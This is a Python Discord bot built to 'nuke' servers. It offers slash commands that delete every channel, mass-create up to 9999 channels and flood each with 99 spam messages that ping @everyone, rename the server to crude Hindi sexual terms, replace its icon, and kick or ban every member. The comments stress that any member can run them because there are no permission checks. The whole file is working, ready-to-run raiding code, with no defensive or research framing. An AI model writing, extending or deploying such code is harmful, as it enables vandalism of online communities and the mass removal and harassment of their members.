import discord
from discord.ext import commands
import os
from dotenv import load_dotenv
import asyncio

load_dotenv()

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="/", intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')
    print(f'Bot is ready and online!')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(e)

# /start command - Bot status
@bot.tree.command(name="start", description="Check if bot is running")
async def start(interaction: discord.Interaction):
    await interaction.response.send_message("✅ Bot is running and online! 24/7 active!")

# Server name and avatar
FUNNY_NAMES = [
    "🍆 LOUDA LASSAN",
    "💦 MUTH BAZI",
    "🍑 GAND MARO",
    "💋 CHUDAI KI DUKAAN",
    "🔞 ADULT ZONE",
    "🍌 LASSAN PARTY",
    "🌮 TACO TUESDAY",
    "🚀 ROCKET FUELED",
    "💥 CHAOS CENTRAL",
    "🎉 PARTY HARD",
]

# Channel name generator - will create 9999 channels with unique names
def generate_channel_names(count=9999):
    names = []
    emojis = ["💀", "☢️", "💣", "🔥", "☠️", "🧨", "💥", "⚠️", "🚨"]
    descriptors = [
        "destroyed", "nuked", "nuke-zone", "burnt-zone", "dead-zone", "chaos-zone",
        "exploded", "system-crashed", "radioactive", "graveyard", "hell-zone", "bombed",
        "total-destruction", "chaos-room", "everything-gone", "critical-damage", "nuclear-zone",
        "rip-server", "burning-zone", "detonation", "fallen-zone", "blast-zone", "impact-zone",
        "nuclear-fallout", "dead-server", "inferno", "war-zone", "no-survivors", "detonated",
        "massive-damage", "toxic-zone", "lost-zone", "ashes", "bomb-zone", "death-zone",
        "blast-area", "wrecked", "fallout-zone", "destroyed-area", "flame-zone", "explosion",
        "dark-zone", "chaos-area", "broken-zone", "nuke-area", "server-rip", "scorched-earth",
        "detonation-zone", "end-zone", "blast-room", "crash-zone", "toxic-waste", "final-zone",
        "burned-out", "nuclear-blast", "dead-end", "destruction-zone", "shockwave", "fallout",
        "ruins", "fire-zone", "war-room", "death-room", "explosive-zone", "wreckage", "hazard-zone",
        "server-ruins", "ash-zone", "bomb-site", "darkness", "blast-zone-2", "destroyed-2", "nuke-2"
    ]
    
    for i in range(count):
        emoji = emojis[i % len(emojis)]
        descriptor = descriptors[i % len(descriptors)]
        names.append(f"{emoji}・{descriptor}-{i+1}")
    
    return names

# Spam messages - 99 unique chaos messages
SPAM_MESSAGES = [
    "🚨💀 @everyone 💀🚨\n\n☢️━━━━━━━━━━━━━━━━━━━━☢️\n💣 𝐂𝐇𝐀𝐎𝐒 𝐀𝐋𝐄𝐑𝐓 💣\n☢️━━━━━━━━━━━━━━━━━━━━☢️\n\n🔥 Server ka mahaul ab full CHAOS mode mein hai! 🔥\n💀 Sabhi members ready raho — kuch bhi ho sakta hai!\n☠️━━━━━━━━━━━━━━━━━━━━☠️",
    
    "💥 𝐃𝐄𝐒𝐓𝐑𝐎𝐘 • 𝐍𝐔𝐊𝐄 • 𝐂𝐇𝐀𝐎𝐒 • 𝐃𝐎𝐎𝐌 💥\n\n🧨 Rules check karo\n☢️ Channels check karo\n💣 Notifications check karo\n🔥 Aur apni team ko ready rakho!",
    
    "⚠️━━━━━━━━━━━━━━━━━━━━⚠️\n🚨 𝐅𝐈𝐍𝐀𝐋 𝐖𝐀𝐑𝐍𝐈𝐍𝐆 🚨\n⚠️━━━━━━━━━━━━━━━━━━━━⚠️\n\n💀 Jo hone wala hai uske liye ready raho...\n🧨 CHAOS IS COMING 🧨\n☢️ THE SERVER IS WATCHING ☢️\n🔥 LET THE CHAOS BEGIN 🔥",
    
    "💥━━━━━━━━━━━━━━━━━━━━💥\n☠️ 𝐃𝐎𝐎𝐌 𝐌𝐎𝐃𝐄 ☠️\n💥━━━━━━━━━━━━━━━━━━━━💥\n\n📢 @everyone — sabko inform kar diya gaya hai.\n🫡 Ab dekhte hain kaun last tak tikta hai... 😈",
    
    "🚨 ALL SYSTEMS DOWN 🚨\n💀 THE NUKE IS ACTIVE 💀\n☠️ EVERYONE IS AFFECTED ☠️\n🔥 NO ESCAPE POSSIBLE 🔥",
    
    "💣 COMPLETE ANNIHILATION IN PROGRESS 💣\n🧨 CHANNELS MULTIPLYING 🧨\n⚠️ SPAM INTENSIFYING ⚠️\n🌪️ CHAOS EVERYWHERE 🌪️",
    
    "🎯 TARGET: ENTIRE SERVER 🎯\n💥 IMPACT: MAXIMUM 💥\n☢️ RADIATION: LETHAL ☢️\n🔞 WARNING LEVEL: EXTREME 🔞",
    
    "👹 THE CHAOS HAS AWAKENED 👹\n🔥 FIRE SPREADING EVERYWHERE 🔥\n💀 DEATH AND DESTRUCTION 💀\n🌋 APOCALYPSE NOW 🌋",
    
    "🎪 WELCOME TO MADNESS 🎪\n🤡 CHAOS CIRCUS IS OPEN 🤡\n🎭 THE SHOW BEGINS 🎭\n🎬 DRAMA UNFOLDS 🎬",
    
    "⚡ LIGHTNING STRIKES ⚡\n🌪️ TORNADO WARNING 🌪️\n❄️ ICE AGE APPROACHING ❄️\n🌊 TSUNAMI INCOMING 🌊",
    
    "🛸 ALIENS INVADING 🛸\n👽 UFO SIGHTING 👽\n🚀 LAUNCH SEQUENCE INITIATED 🚀\n🌌 SPACE DISTORTION 🌌",
    
    "🦖 DINOSAURS RISING 🦖\n🦕 PREHISTORIC CHAOS 🦕\n🐉 DRAGONS ATTACKING 🐉\n🦑 DEEP SEA MONSTERS 🦑",
    
    "💍 THE RING OF CHAOS 💍\n🎰 FATE'S CASINO 🎰\n🃏 WILD CARDS DRAWN 🃏\n🎲 DICE OF DOOM 🎲",
    
    "👻 GHOSTS EVERYWHERE 👻\n🧟 ZOMBIES RISING 🧟\n👹 DEMONS UNLEASHED 👹\n☠️ DEATH ITSELF AWAKENS ☠️",
    
    "🎸 CHAOS METAL PLAYING 🎸\n🎤 SCREAMS OF AGONY 🎤\n🎺 APOCALYPSE ANTHEM 🎺\n🥁 DOOM DRUMS BEATING 🥁",
    
    "🍕 PIZZA PARTY CHAOS 🍕\n🍔 BURGER MADNESS 🍔\n🍗 CHICKEN MASSACRE 🍗\n🍖 MEAT GRINDER 🍖",
    
    "💎 DIAMOND HANDS HOLDING 💎\n📈 STOCKS CRASHING 📈\n💹 MARKET CHAOS 💹\n💰 MONEY FLOWING 💰",
    
    "🏆 VICTORY IN CHAOS 🏆\n🥇 FIRST PLACE DESTRUCTION 🥇\n🎖️ MEDALS OF MAYHEM 🎖️\n👑 CROWN OF CHAOS 👑",
    
    "🌹 ROSES WILTING 🌹\n🌻 SUNFLOWERS DYING 🌻\n🌿 GREENERY GONE 🌿\n🍂 AUTUMN OF DESPAIR 🍂",
    
    "❤️ LOVE IS GONE ❤️\n💔 HEARTS BREAKING 💔\n💕 PASSION CONSUMED 💕\n💖 ROMANCE DESTROYED 💖",
    
    "🔮 FUTURE IS WRITTEN 🔮\n📖 BOOK OF DESTINY 📖\n🎓 LESSONS IN CHAOS 🎓\n🧠 MIND CORRUPTION 🧠",
    
    "🌟 STARS EXPLODING 🌟\n💫 GALAXIES COLLIDING 💫\n🌠 COSMIC CHAOS 🌠\n☄️ METEOR SHOWER 🌠",
    
    "🎨 ART OF DESTRUCTION 🎨\n🖼️ MASTERPIECE OF CHAOS 🖼️\n🖌️ PAINTED IN BLOOD 🖌️\n✏️ WRITTEN IN FIRE ✏️",
    
    "🎓 CHAOS ACADEMY 🎓\n📚 BOOKS OF MADNESS 📚\n🖊️ PENS OF DOOM 🖊️\n📝 DOCUMENTS OF DESTRUCTION 📝",
    
    "⚽ FOOTBALL CHAOS ⚽\n🏀 BASKETBALL MADNESS 🏀\n🎾 TENNIS OF TERROR 🎾\n🏐 VOLLEYBALL VIOLENCE 🏐",
    
    "🚗 CARS CRASHING 🚗\n✈️ PLANES FALLING ✈️\n🚁 HELICOPTERS SPINNING 🚁\n🚢 SHIPS SINKING 🚢",
    
    "🍎 APPLES ROTTING 🍎\n🍊 ORANGES EXPLODING 🍊\n🍋 LEMONS ACIDIC 🍋\n🍌 BANANAS BRUISED 🍌",
    
    "💻 COMPUTERS CRASHING 💻\n⌨️ KEYBOARDS BURNING ⌨️\n🖱️ MICE DYING 🖱️\n🖥️ SCREENS SHATTERING 🖥️",
    
    "📱 PHONES EXPLODING 📱\n📞 CALLS DROPPED 📞\n📲 TEXTS CORRUPTED 📲\n📡 SIGNALS LOST 📡",
    
    "🎬 MOVIE PREMIERE 🎬\n🎥 CAMERA ROLLING 🎥\n🎞️ FILM REELS BURNING 🎞️\n📹 RECORD EVERYTHING 📹",
    
    "🏥 HOSPITAL EMERGENCY 🏥\n⚕️ DOCTORS PANICKING ⚕️\n💊 PILLS EVERYWHERE 💊\n🩺 DIAGNOSIS: CHAOS 🩺",
    
    "🏫 SCHOOL LOCKDOWN 🏫\n📚 BOOKS SCATTERED 📚\n✏️ PENCILS BROKEN ✏️\n🎒 BACKPACKS TORN 🎒",
    
    "👔 BUSINESS COLLAPSE 👔\n💼 BRIEFCASES LOST 💼\n📊 REPORTS DESTROYED 📊\n💵 MONEY BURNING 💵",
    
    "👗 FASHION DISASTER 👗\n👠 SHOES MELTING 👠\n👜 BAGS RIPPED 👜\n💄 MAKEUP SMEARED 💄",
    
    "🏠 HOUSES DESTROYED 🏠\n🏢 BUILDINGS CRASHING 🏢\n🏰 CASTLES BURNING 🏰\n🗿 STATUES TOPPLING 🗿",
    
    "⛪ CHURCHES SHAKING ⛪\n🕌 MOSQUES TREMBLING 🕌\n🏛️ TEMPLES COLLAPSING 🏛️\n🕍 SYNAGOGUES BURNING 🕍",
    
    "🌍 EARTH EXPLODING 🌍\n🌎 CONTINENTS SHIFTING 🌎\n🌏 TECTONIC PLATES MOVING 🌏\n🌐 WORLD ENDING 🌐",
    
    "⛈️ STORMS RAGING ⛈️\n🌩️ LIGHTNING FLASHING 🌩️\n❄️ SNOW BLINDING ❄️\n☀️ SUN BURNING ☀️",
    
    "🎹 PIANOS SMASHING 🎹\n🎸 GUITARS BREAKING 🎸\n🥁 DRUMS EXPLODING 🥁\n🎺 TRUMPETS SCREAMING 🎺",
    
    "🍕 PIZZA JOINTS CLOSING 🍕\n🍔 BURGER STANDS BURNING 🍔\n🍟 FRIES SOGGY 🍟\n🌭 HOT DOGS COLD 🌭",
    
    "⚔️ SWORDS CLASHING ⚔️\n🏹 ARROWS FLYING 🏹\n💣 BOMBS EXPLODING 💣\n🔫 GUNS FIRING 🔫",
    
    "👨‍⚖️ JUDGES CONFUSED 👨‍⚖️\n👨‍🚔 POLICE OVERWHELMED 👨‍🚔\n👨‍🚒 FIREFIGHTERS EXHAUSTED 👨‍🚒\n👨‍⚕️ DOCTORS DESPERATE 👨‍⚕️",
    
    "🌳 TREES FALLING 🌳\n🌲 FORESTS BURNING 🌲\n🌴 PALMS WITHERING 🌴\n🌵 DESERT EXPANDING 🌵",
    
    "🐕 DOGS BARKING 🐕\n🐈 CATS HISSING 🐈\n🐘 ELEPHANTS STAMPEDING 🐘\n🦁 LIONS ROARING 🦁",
    
    "🦅 EAGLES DIVING 🦅\n🦜 PARROTS SCREAMING 🦜\n🦆 DUCKS QUACKING 🦆\n🦢 SWANS HISSING 🦢",
    
    "🌊 WAVES CRASHING 🌊\n⛵ BOATS SINKING ⛵\n🏄 SURFERS DROWNING 🏄\n🏊 SWIMMERS PANICKING 🏊",
    
    "❓ QUESTIONS UNANSWERED ❓\n❔ CONFUSION EVERYWHERE ❔\n❗ EXCLAMATION MARKS ❗\n⁉️ PANIC MODE ON ⁉️",
    
    "🔐 LOCKS BROKEN 🔐\n🔓 DOORS OPEN 🔓\n🗝️ KEYS LOST 🗝️\n🔑 EVERYTHING UNLOCKED 🔑",
    
    "💐 FLOWERS DEAD 💐\n🌺 GARDENS DESTROYED 🌺\n🌸 PETALS SCATTERED 🌸\n🌼 BEAUTY GONE 🌼",
]

# Confirmation view with buttons
class ConfirmView(discord.ui.View):
    def __init__(self, timeout=60):
        super().__init__(timeout=timeout)
        self.confirmed = False

    @discord.ui.button(label="✅ CONFIRM NUKE", style=discord.ButtonStyle.danger)
    async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        self.confirmed = True
        for child in self.children:
            child.disabled = True
        await interaction.message.edit(view=self)
        self.stop()

    @discord.ui.button(label="❌ CANCEL", style=discord.ButtonStyle.secondary)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        for child in self.children:
            child.disabled = True
        await interaction.message.edit(view=self, content="❌ Nuke cancelled!")
        self.stop()

# /nuke command - Delete all channels, create 9999 new ones, then spam 99 times each
# ✅ NO ADMIN/ROLE CHECKS - ALL MEMBERS CAN USE
@bot.tree.command(name="nuke", description="Delete all channels, create 9999 new ones, spam 99 times each")
async def nuke(interaction: discord.Interaction):
    await interaction.response.defer()
    
    guild = interaction.guild
    
    if not guild:
        await interaction.followup.send("❌ This command can only be used in a server!")
        return
    
    # Show confirmation button
    view = ConfirmView()
    await interaction.followup.send("⚠️ **ARE YOU SURE?** This will create 9999 channels with 99 spam each! Click to confirm NUKE!", view=view)
    await view.wait()
    
    if not view.confirmed:
        return
    
    try:
        # STEP 1: Delete all channels
        channels = list(guild.channels)
        total_channels = len(channels)
        deleted_count = 0
        
        await interaction.followup.send(f"🔄 **STEP 1:** Deleting {total_channels} channels...")
        
        for channel in channels:
            try:
                await channel.delete()
                deleted_count += 1
                print(f"Deleted channel: {channel.name}")
                await asyncio.sleep(0.05)
            except Exception as e:
                print(f"Failed to delete {channel.name}: {e}")
        
        await interaction.followup.send(f"✅ Deleted {deleted_count}/{total_channels} channels!")
        
        # STEP 2: Create 9999 new channels - WAIT UNTIL ALL ARE CREATED
        await interaction.followup.send(f"🔄 **STEP 2:** Creating 9999 new channels... (this may take a while)")
        
        channel_names = generate_channel_names(9999)
        created_count = 0
        new_channels = []
        
        for i, channel_name in enumerate(channel_names):
            try:
                ch = await guild.create_text_channel(channel_name)
                new_channels.append(ch)
                created_count += 1
                
                # Update progress every 100 channels
                if created_count % 100 == 0:
                    await interaction.followup.send(f"📊 Progress: {created_count}/9999 channels created...")
                    print(f"Created {created_count}/9999 channels")
                
                await asyncio.sleep(0.05)
            except Exception as e:
                print(f"Failed to create {channel_name}: {e}")
                await asyncio.sleep(0.1)
        
        await interaction.followup.send(f"✅ **ALL {created_count}/9999 CHANNELS CREATED!** Now starting spam phase...")
        
        # STEP 3: NOW SPAM 99 TIMES IN EACH CHANNEL - ONLY AFTER ALL CHANNELS ARE CREATED
        await interaction.followup.send(f"🔄 **STEP 3:** Sending 99 spam messages to all {created_count} channels...\n⚠️ This will take a LONG time - approximately 15-30 minutes!")
        
        total_spam_count = 0
        channels_spammed = 0
        
        for i, channel in enumerate(new_channels):
            try:
                # Send 99 spam messages to each channel
                for spam_index in range(99):
                    try:
                        # Use different messages from the list (rotate through them)
                        msg = SPAM_MESSAGES[spam_index % len(SPAM_MESSAGES)]
                        await channel.send(msg)
                        total_spam_count += 1
                        await asyncio.sleep(0.01)
                    except Exception as e:
                        print(f"Failed to send spam message in {channel.name}: {e}")
                        break
                
                channels_spammed += 1
                
                # Update progress every 100 channels
                if (i + 1) % 100 == 0:
                    await interaction.followup.send(f"📊 Spam Progress: {i + 1}/{created_count} channels spammed ({total_spam_count} total messages)...")
            except Exception as e:
                print(f"Error spamming in {channel.name}: {e}")
        
        # STEP 4: Change server name
        import random
        new_name = random.choice(FUNNY_NAMES)
        try:
            await guild.edit(name=new_name)
            await interaction.followup.send(f"✅ **STEP 4:** Server renamed to: **{new_name}**")
            print(f"Server renamed to: {new_name}")
        except Exception as e:
            print(f"Failed to rename server: {e}")
        
        # STEP 5: Change server avatar
        try:
            cat_image_url = "https://i.pinimg.com/originals/4f/71/37/4f713759b8b8b53173dd3c2e8de8ae76.jpg"
            async with __import__('aiohttp').ClientSession() as session:
                async with session.get(cat_image_url) as resp:
                    if resp.status == 200:
                        avatar_data = await resp.read()
                        await guild.edit(icon=avatar_data)
                        await interaction.followup.send(f"✅ **STEP 5:** Server avatar changed to cat! 🐱")
                        print("Server avatar changed to cat")
        except Exception as e:
            print(f"Failed to change avatar: {e}")
        
        # Final summary
        await interaction.followup.send(
            f"\n🎉 **💥 COMPLETE NUKE SUCCESSFUL! 💥**\n\n"
            f"✅ Deleted: {deleted_count} channels\n"
            f"✅ Created: {created_count}/9999 channels\n"
            f"✅ Spam Messages: {total_spam_count} sent (99 per channel)\n"
            f"✅ Server Name: {new_name}\n"
            f"✅ Server Avatar: Cat Image 🐱\n\n"
            f"🔥 SERVER COMPLETELY NUKED! 🔥\n"
            f"🌪️ CHAOS IS MAXIMUM! 🌪️"
        )
        
    except Exception as e:
        await interaction.followup.send(f"❌ Error occurred: {str(e)}")
        print(f"Nuke command error: {e}")

# /kick command - Kick all members
# ✅ NO ADMIN/ROLE CHECKS - ALL MEMBERS CAN USE
@bot.tree.command(name="kick", description="Kick all members from the server")
async def kick(interaction: discord.Interaction):
    await interaction.response.defer()
    
    guild = interaction.guild
    
    if not guild:
        await interaction.followup.send("❌ This command can only be used in a server!")
        return
    
    try:
        members = guild.members
        total_members = len(members)
        kicked_count = 0
        
        await interaction.followup.send(f"🔄 Starting to kick {total_members} members...")
        
        for member in members:
            try:
                if member.id != interaction.user.id and not member.bot:  # Don't kick yourself or bot
                    await member.kick(reason="Server chaos mode activated!")
                    kicked_count += 1
                    print(f"Kicked member: {member.name}")
                    await asyncio.sleep(0.1)
            except Exception as e:
                print(f"Failed to kick {member.name}: {e}")
        
        await interaction.followup.send(f"✅ 💥 KICKED {kicked_count}/{total_members} members! CHAOS MODE ACTIVATED! 💥")
        
    except Exception as e:
        await interaction.followup.send(f"❌ Error occurred: {str(e)}")
        print(f"Kick command error: {e}")

# /ban command - Ban all members
# ✅ NO ADMIN/ROLE CHECKS - ALL MEMBERS CAN USE
@bot.tree.command(name="ban", description="Ban all members from the server")
async def ban(interaction: discord.Interaction):
    await interaction.response.defer()
    
    guild = interaction.guild
    
    if not guild:
        await interaction.followup.send("❌ This command can only be used in a server!")
        return
    
    try:
        members = guild.members
        total_members = len(members)
        banned_count = 0
        
        await interaction.followup.send(f"🔄 Starting to ban {total_members} members...")
        
        for member in members:
            try:
                if member.id != interaction.user.id and not member.bot:  # Don't ban yourself or bot
                    await guild.ban(member, reason="Server chaos mode activated!")
                    banned_count += 1
                    print(f"Banned member: {member.name}")
                    await asyncio.sleep(0.1)
            except Exception as e:
                print(f"Failed to ban {member.name}: {e}")
        
        await interaction.followup.send(f"✅ 💥 BANNED {banned_count}/{total_members} members! TOTAL DEVASTATION! 💥")
        
    except Exception as e:
        await interaction.followup.send(f"❌ Error occurred: {str(e)}")
        print(f"Ban command error: {e}")

# Error handlers
@nuke.error
async def nuke_error(interaction: discord.Interaction, error: discord.app_commands.AppCommandError):
    await interaction.response.send_message(f"❌ Error: {str(error)}", ephemeral=True)

@kick.error
async def kick_error(interaction: discord.Interaction, error: discord.app_commands.AppCommandError):
    await interaction.response.send_message(f"❌ Error: {str(error)}", ephemeral=True)

@ban.error
async def ban_error(interaction: discord.Interaction, error: discord.app_commands.AppCommandError):
    await interaction.response.send_message(f"❌ Error: {str(error)}", ephemeral=True)

# Run bot
token = os.getenv('DISCORD_TOKEN')
if token:
    bot.run(token)
else:
    print("❌ DISCORD_TOKEN not found in .env file")
